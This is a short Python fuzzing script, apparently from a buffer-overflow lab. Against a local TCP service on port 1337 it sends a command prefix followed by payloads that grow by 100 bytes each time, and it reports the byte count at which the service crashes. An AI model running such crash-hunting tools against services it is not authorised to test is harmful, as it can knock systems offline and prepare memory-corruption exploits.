#!/usr/bin/env python3

import socket, sys, time
host = "127.0.0.1"
port = 1337
timeout = 2 


def attack():
    prefix = sys.argv[1]
    payload = prefix + " " + "a"*100
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((host, port))
                s.recv(1024) # welcome banner
                print(f"fuzzing with {len(payload) - len(prefix) - 1} bytes...")
                s.send(bytes(payload, 'latin-1'))
                s.recv(1024) # prefix complete message
        except:
            print(f"Application crashed at {len(payload) - len(prefix)}")
            sys.exit(0)
        
        payload += "a"*100
                
if __name__== "__main__":
    
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <Command>")
        sys.exit(1)
    
    attack()
